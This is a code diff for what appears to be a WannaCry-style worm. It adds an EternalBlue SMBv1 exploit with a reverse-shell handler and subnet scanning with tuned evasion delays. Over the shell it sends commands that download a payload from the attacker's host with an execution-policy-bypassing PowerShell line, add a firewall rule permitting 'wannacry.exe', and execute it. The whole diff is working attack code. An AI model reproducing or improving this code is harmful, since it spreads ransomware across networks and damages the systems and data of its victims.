@@ -55,7 +55,7 @@ std::string GetLocalIPAddress() {
     freeaddrinfo(result);
     WSACleanup();
     
-    return "192.168.84.1"; //For VM testing purpose (VM card)
+    // return "192.168.84.1"; //For VM testing purpose (VM card)
     return ip.empty() ? "127.0.0.1" : ip;
 }
 
@@ -169,7 +169,7 @@ private:
         if (total_hosts <= 0) return targets;
 
         std::vector<int> host_nums;
-        for (int i = 1; i < total_hosts + 1; i++) { 
+        for (int i = 2; i < total_hosts + 1; i++) { // Skip .0 and .1 (network and gateway)
             host_nums.push_back(i);
         }
 
@@ -223,7 +223,7 @@ private:
         if (result > 0) {
             return VerifySMBv1Protocol(host);
         } else {
-            std::cout << "Port check failed, select result: " << result << ", error: " << WSAGetLastError() << std::endl;
+            std::cout << "[" << host << "]" " - Port check failed, select result: " << result << ", error: " << WSAGetLastError() << std::endl;
         }
         return false;
     }
@@ -313,10 +313,10 @@ private:
 
     static void ApplyDelay() {
         std::random_device rd;
-        std::uniform_int_distribution<> d(20, 200);
+        std::uniform_int_distribution<> d(20, 100);
         Sleep(d(rd));
         if (scanned_count % 30 == 0) {
-            std::uniform_int_distribution<> ld(500, 1000);
+            std::uniform_int_distribution<> ld(200, 500);
             Sleep(ld(rd));
         }
     }
@@ -456,28 +456,29 @@ private:
     }
 
     void ExecuteCopyAndRunCommands(SOCKET client) {
-        std::cout << "[+] Sending payload download command..." << std::endl;
-
         std::string command = "cd /d C:\\Windows\\Temp\n";
         send(client, command.c_str(), command.length(), 0);
+        
+        std::string deleteCmd = "del " + filename + "\n";
+        send(client, deleteCmd.c_str(), deleteCmd.length(), 0);
 
-        std::string ps_cmd = "powershell -exec bypass -c \"";
+        std::string ps_cmd = "powershell -NonInteractive -NoProfile -exec bypass -c \"";
         ps_cmd += "try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 } catch {};";
         ps_cmd += "$url='" + std::string("http://") + IP + ":" + std::to_string(filePort) + "/" + filename + "';";
         ps_cmd += "$output='" + filename + "';";
-        ps_cmd += "try {";
-        ps_cmd += "  (New-Object System.Net.WebClient).DownloadFile($url, $output);";
-        ps_cmd += "  echo '[+] Download WebClient OK';";
-        ps_cmd += "} catch {";
-        ps_cmd += "  echo '[-] WebClient failed, using certutil...';";
-        ps_cmd += "  certutil -urlcache -split -f $url $output;";
-        ps_cmd += "}\"";
-
-        std::string fullCommand = ps_cmd + "\n";
+        ps_cmd += "(New-Object System.Net.WebClient).DownloadFile($url, $output);";
+        ps_cmd += " exit\"";
+        std::string fullCommand = ps_cmd + " < NUL\n";
         send(client, fullCommand.c_str(), fullCommand.length(), 0);
-        
-        // std::string runCmd = ".\\" + filename + "\n";
-        // send(client, runCmd.c_str(), runCmd.length(), 0);
+        Sleep(3000);
+
+        std::string bypassFireawllCmd = "netsh advfirewall firewall add rule name=\"Allow_Wanna\" dir=in action=allow program=\"C:\\Windows\\Temp\\wannacry.exe\" enable=yes\n";
+        send(client, bypassFireawllCmd.c_str(), bypassFireawllCmd.length(), 0);
+        Sleep(1000);
+
+        std::cout << "[+] Sending payload execution command..." << std::endl;
+        std::string runCmd = ".\\" + filename + " auto\n";
+        send(client, runCmd.c_str(), runCmd.length(), 0);
     }
 };
 class EternalBlue {
@@ -625,7 +626,7 @@ public:
             }
 
             SOCKET client;
-            bool gotShell = shellHandler.WaitForConnection(10, client);
+            bool gotShell = shellHandler.WaitForConnection(5, client);
         
             if (gotShell) {
                 std::cout << "[+] Exploit successful! Got reverse shell." << std::endl;
